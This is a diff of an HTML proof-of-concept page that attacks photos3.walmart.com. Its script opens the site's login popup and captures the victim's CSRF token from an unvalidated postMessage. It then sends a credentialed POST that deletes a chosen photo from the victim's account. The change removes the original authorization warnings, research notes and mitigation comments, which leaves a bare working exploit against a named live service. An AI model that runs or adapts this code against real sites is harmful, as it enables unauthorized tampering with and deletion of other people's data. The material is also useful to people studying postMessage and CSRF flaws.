@@ -1,154 +1,84 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
     <meta charset="UTF-8">
-    <title>Login Flow PoC - Security Research</title>
-    <style>
-        body { font-family: monospace; padding: 20px; background: #1a1a2e; color: #eee; }
-        .container { max-width: 800px; margin: 0 auto; }
-        .btn { 
-            background: #e94560; color: white; border: none; padding: 12px 24px; 
-            font-size: 16px; cursor: pointer; border-radius: 4px; margin: 10px 0;
-        }
-        .btn:hover { background: #c73e54; }
-        .btn:disabled { background: #555; cursor: not-allowed; }
-        .log { 
-            background: #16213e; padding: 15px; border-radius: 4px; 
-            margin: 10px 0; border-left: 3px solid #0f3460; 
-            white-space: pre-wrap; font-size: 13px;
-        }
-        .success { border-left-color: #4ade80; }
-        .error { border-left-color: #f87171; }
-        .warning { border-left-color: #fbbf24; }
-        input { 
-            padding: 8px; margin: 5px 0; width: 100%; 
-            background: #16213e; border: 1px solid #0f3460; color: #eee;
-        }
-        label { display: block; margin: 15px 0 5px; color: #aaa; }
-    </style>
+    <title>PoC - Login to Delete Chain</title>
 </head>
 <body>
-<div class="container">
-    <h2>🔐 Login Flow Security Research PoC</h2>
-    <p><strong>Target:</strong> photos3.walmart.com</p>
-    <p><strong>Vulnerability:</strong> Unvalidated postMessage origin + Shared domain cookies</p>
+    <h3>PoC - Security Research</h3>
     
-    <label>Photo ID to delete (from victim's account):</label>
-    <input type="text" id="photoId" value="11863114291" placeholder="Enter photo ID">
+    Photo ID: <input type="text" id="photoId" value="11863114291"><br><br>
     
-    <label>CSRF Token (auto-captured after login):</label>
-    <input type="text" id="csrfToken" placeholder="Will be populated automatically" readonly>
+    <button onclick="startFlow()">Start Attack Flow</button>
     
-    <button class="btn" id="startBtn" onclick="startAttack()">
-        ▶ Start Attack Flow
-    </button>
-    
-    <div id="logs"></div>
-</div>
+    <pre id="log" style="background:#f4f4f4; padding:10px; max-height:400px; overflow:auto;"></pre>
 
 <script>
-// ⚠️ SECURITY RESEARCH ONLY - AUTHORIZED TESTING ONLY
-// This PoC demonstrates a potential authentication bypass chain
-// Do not use against systems you do not have explicit permission to test
-
-const CONFIG = {
-    loginUrl: 'https://photos3.walmart.com/users/oauth2/login',
-    deleteEndpoint: 'https://photos3.walmart.com/order/add_from_prints_builder',
-    builderUrl: 'https://photos3.walmart.com/order/prints-builder',
-    trustedOrigins: [
-        'https://photos3.walmart.com',
-        'https://www.walmart.com'
-    ]
+const TARGET = {
+    login: 'https://photos3.walmart.com/users/oauth2/login',
+    builder: 'https://photos3.walmart.com/order/prints-builder',
+    delete: 'https://photos3.walmart.com/order/add_from_prints_builder'
 };
 
-let popup = null;
-let capturedData = null;
-let apiCsrfToken = null;
+let csrfToken = null;
 
-function log(message, type = 'info') {
-    const logs = document.getElementById('logs');
-    const entry = document.createElement('div');
-    entry.className = `log ${type}`;
-    entry.textContent = `[${new Date().toLocaleTimeString()}] ${message}`;
-    logs.prepend(entry);
-    console.log(`[${type}] ${message}`);
+function log(msg) {
+    document.getElementById('log').textContent += `[${new Date().toLocaleTimeString()}] ${msg}\n`;
+    console.log(msg);
 }
 
-function extractCsrfFromMessage(data) {
-    try {
-        if (typeof data === 'string' && data.includes('login:')) {
-            const jsonPart = data.split('login:')[1];
-            const parsed = JSON.parse(jsonPart);
-            return parsed.csrf || null;
-        }
-        if (typeof data === 'object' && data.csrf) {
-            return data.csrf;
-        }
-    } catch (e) {
-        log(`Failed to parse CSRF: ${e.message}`, 'error');
-    }
-    return null;
-}
-
-async function extractApiCsrfToken() {
-    log('Attempting to extract API CSRF token from prints-builder...');
+function startFlow() {
+    log('Step 1: Opening login popup...');
     
-    return new Promise((resolve) => {
-        const iframe = document.createElement('iframe');
-        iframe.src = CONFIG.builderUrl;
-        iframe.style.display = 'none';
-        iframe.sandbox = 'allow-scripts allow-same-origin';
+    const popup = window.open(TARGET.login, 'loginPopup', 'width=700,height=800');
+    if (!popup) {
+        log('ERROR: Popup blocked. Allow popups for this page.');
+        return;
+    }
+    
+    // Listen for postMessage after login
+    window.addEventListener('message', function handleMsg(event) {
+        log(`Step 2: Message from ${event.origin}`);
+        log(`Raw data: ${event.data}`);
         
-        iframe.onload = function() {
+        // Extract CSRF from login:{...} message
+        if (typeof event.data === 'string' && event.data.includes('login:')) {
             try {
-                // Try common locations for CSRF token
-                const doc = iframe.contentDocument;
+                const jsonStr = event.data.split('login:')[1];
+                const data = JSON.parse(jsonStr);
+                csrfToken = data.csrf;
+                log(`✓ Captured CSRF: ${csrfToken}`);
                 
-                // Method 1: Meta tag
-                const metaToken = doc.querySelector('meta[name="csrf-token"]')?.content;
-                if (metaToken) {
-                    log('Found CSRF token in meta tag', 'success');
-                    resolve(metaToken);
-                    return;
-                }
+                // Step 3: Open builder page
+                log('Step 3: Opening prints-builder...');
+                const builder = window.open(TARGET.builder, '_blank');
                 
-                // Method 2: Script variable (regex search)
-                const scripts = doc.getElementsByTagName('script');
-                for (let script of scripts) {
-                    const content = script.textContent || '';
-                    const match = content.match(/["']?csrf["']?\s*[:=]\s*["']([^"']+)["']/i);
-                    if (match && match[1]) {
-                        log('Found CSRF token in script', 'success');
-                        resolve(match[1]);
-                        return;
-                    }
-                }
-                
-                // Method 3: Check network requests via proxy (requires user interaction)
-                log('Could not auto-extract API token. Will try using login CSRF...', 'warning');
-                resolve(null);
+                // Step 4: Send delete request after short delay
+                setTimeout(() => sendDelete(), 2500);
                 
             } catch (e) {
-                log(`Cannot access iframe content (CORS): ${e.message}`, 'warning');
-                resolve(null);
+                log(`Failed to parse message: ${e.message}`);
             }
-            document.body.removeChild(iframe);
-        };
-        
-        document.body.appendChild(iframe);
-        
-        // Timeout fallback
-        setTimeout(() => {
-            if (iframe.parentNode) {
-                document.body.removeChild(iframe);
-            }
-            resolve(null);
-        }, 5000);
+        }
     });
+    
+    log('Waiting for login completion...');
 }
 
-async function sendDeleteRequest(csrfToken, photoId) {
-    log(`Sending delete request for photo ID: ${photoId}`);
+async function sendDelete() {
+    const photoId = document.getElementById('photoId').value.trim();
+    
+    if (!csrfToken) {
+        log('ERROR: No CSRF token captured');
+        return;
+    }
+    
+    if (!photoId) {
+        log('ERROR: No photo ID');
+        return;
+    }
+    
+    log(`Step 4: Sending DELETE request for photo ${photoId}`);
     
     const payload = {
         sizes: [],
@@ -156,197 +86,39 @@ async function sendDeleteRequest(csrfToken, photoId) {
     };
     
     try {
-        const response = await fetch(CONFIG.deleteEndpoint, {
+        const response = await fetch(TARGET.delete, {
             method: 'POST',
-            credentials: 'include',
+            credentials: 'include',  // Auto-send cookies: _web-kiosk_session, etc.
             headers: {
                 'Content-Type': 'application/json',
                 'X-Csrf-Token': csrfToken,
                 'Origin': 'https://photos3.walmart.com',
-                'Referer': CONFIG.builderUrl
+                'Referer': TARGET.builder
+                // Note: Newrelic, Traceparent, etc. are optional for functionality
             },
             body: JSON.stringify(payload)
         });
         
-        const result = await response.text();
+        const text = await response.text();
         
-        if (response.ok || response.status === 200) {
-            log(`✅ Request successful! Status: ${response.status}`, 'success');
-            log(`Response: ${result.substring(0, 200)}...`);
-            return true;
-        } else {
-            log(`❌ Request failed. Status: ${response.status}`, 'error');
-            log(`Response: ${result.substring(0, 200)}...`);
-            return false;
+        log(`Response: ${response.status} ${response.statusText}`);
+        log(`Body: ${text}`);
+        
+        if (response.ok) {
+            log('✅ SUCCESS: Delete request accepted');
+        } else if (response.status === 403) {
+            log('❌ 403: CSRF token may not be valid for this endpoint');
+        } else if (response.status === 401) {
+            log('❌ 401: Session not valid or cookies not sent');
         }
-    } catch (error) {
-        log(`❌ Network error: ${error.message}`, 'error');
-        return false;
-    }
-}
-
-async function startAttack() {
-    const startBtn = document.getElementById('startBtn');
-    const photoId = document.getElementById('photoId').value.trim();
-    
-    if (!photoId) {
-        log('Please enter a photo ID', 'error');
-        return;
-    }
-    
-    startBtn.disabled = true;
-    startBtn.textContent = '⏳ In Progress...';
-    
-    log('Step 1: Opening login popup...');
-    
-    // Open the login popup
-    popup = window.open(
-        CONFIG.loginUrl,
-        'loginPopup',
-        'width=700,height=800,left=100,top=100'
-    );
-    
-    if (!popup) {
-        log('❌ Popup blocked! Please allow popups for this site', 'error');
-        startBtn.disabled = false;
-        startBtn.textContent = '▶ Start Attack Flow';
-        return;
-    }
-    
-    log('Step 2: Waiting for login completion message...');
-    
-    // Set up message listener
-    const messageHandler = async function(event) {
-        // ⚠️ VULNERABILITY: No origin validation in target app
-        // We intentionally skip origin check to demonstrate the flaw
-        // In production, you SHOULD validate: 
-        // if (!CONFIG.trustedOrigins.includes(event.origin)) return;
         
-        log(`Message received from: ${event.origin}`);
-        log(`Raw data: ${JSON.stringify(event.data).substring(0, 150)}...`);
-        
-        // Extract CSRF from login message
-        const loginCsrf = extractCsrfFromMessage(event.data);
-        
-        if (loginCsrf) {
-            log(`✅ Captured login CSRF token`, 'success');
-            document.getElementById('csrfToken').value = loginCsrf;
-            capturedData = event.data;
-            
-            // Close popup
-            if (popup && !popup.closed) {
-                popup.close();
-                log('Popup closed');
-            }
-            
-            // Remove listener to avoid duplicate processing
-            window.removeEventListener('message', messageHandler);
-            
-            // Proceed to next step
-            await executeDeleteFlow(loginCsrf, photoId);
-        } else {
-            log('⚠️ Could not extract CSRF from message', 'warning');
-        }
-    };
-    
-    window.addEventListener('message', messageHandler);
-    
-    // Fallback timeout
-    setTimeout(() => {
-        if (popup && !popup.closed) {
-            popup.close();
-            log('Popup timeout - user may not have completed login', 'warning');
-        }
-        window.removeEventListener('message', messageHandler);
-        startBtn.disabled = false;
-        startBtn.textContent = '▶ Start Attack Flow';
-    }, 120000); // 2 minutes
-}
-
-async function executeDeleteFlow(loginCsrf, photoId) {
-    log('Step 3: Attempting to obtain API CSRF token...');
-    
-    // Try to get the API-specific CSRF token
-    const apiCsrf = await extractApiCsrfToken();
-    
-    // Determine which token to use
-    const tokenToUse = apiCsrf || loginCsrf;
-    const tokenSource = apiCsrf ? 'API token (extracted)' : 'Login token (from onLoggedIn)';
-    
-    log(`Using CSRF token from: ${tokenSource}`);
-    
-    log('Step 4: Sending delete request...');
-    const success = await sendDeleteRequest(tokenToUse, photoId);
-    
-    // Reset UI
-    const startBtn = document.getElementById('startBtn');
-    startBtn.disabled = false;
-    startBtn.textContent = '▶ Start Attack Flow';
-    
-    if (success) {
-        log('🎯 Attack chain completed successfully!', 'success');
-        log('⚠️ This demonstrates a critical authentication bypass vulnerability');
-    } else {
-        log('❌ Attack chain failed - but vulnerability may still exist', 'warning');
-        log('Try manual testing with captured tokens');
+    } catch (err) {
+        log(`❌ Fetch error: ${err.message}`);
+        log('Note: CORS may block this request from a different origin');
     }
 }
 
-// Optional: Manual token testing
-async function testWithManualToken() {
-    const manualToken = document.getElementById('csrfToken').value.trim();
-    const photoId = document.getElementById('photoId').value.trim();
-    
-    if (!manualToken || !photoId) {
-        log('Please provide both CSRF token and photo ID', 'error');
-        return;
-    }
-    
-    log('Testing with manually provided token...');
-    await sendDeleteRequest(manualToken, photoId);
-}
-
-// Add manual test button
-document.addEventListener('DOMContentLoaded', () => {
-    const container = document.querySelector('.container');
-    const manualBtn = document.createElement('button');
-    manualBtn.className = 'btn';
-    manualBtn.style.background = '#0f3460';
-    manualBtn.textContent = '🧪 Test with Manual Token';
-    manualBtn.onclick = testWithManualToken;
-    container.appendChild(manualBtn);
-    
-    log('PoC loaded. Click "Start Attack Flow" to begin.', 'info');
-    log('Ensure you have authorization before testing.', 'warning');
-});
+log('PoC loaded. Click button to start.');
 </script>
-
-<!-- 
-SECURITY RESEARCH NOTES:
-========================
-Vulnerability Chain:
-1. Login popup sends sensitive data via window.onLoggedIn() without origin validation
-2. Attacker can override onLoggedIn() in parent window to capture CSRF tokens
-3. Shared domain cookies (.walmart.com) allow session reuse across subdomains
-4. CSRF tokens may be reusable across different API endpoints
-
-Impact:
-- Unauthorized deletion/modification of user photos
-- Potential account takeover if other endpoints are vulnerable
-- Privacy violation through access to order/basket data
-
-Mitigation:
-- Validate event.origin in message listeners
-- Use postMessage with specific targetOrigin instead of global functions
-- Implement nonce/state parameters to prevent replay attacks
-- Scope CSRF tokens to specific actions/endpoints
-- Consider SameSite=Strict for sensitive cookies
-
-TESTING GUIDELINES:
-- Only test systems you have explicit written authorization to assess
-- Do not modify or delete data belonging to other users
-- Report findings through official bug bounty channels
-- Follow responsible disclosure practices
--->
 </body>
 </html>
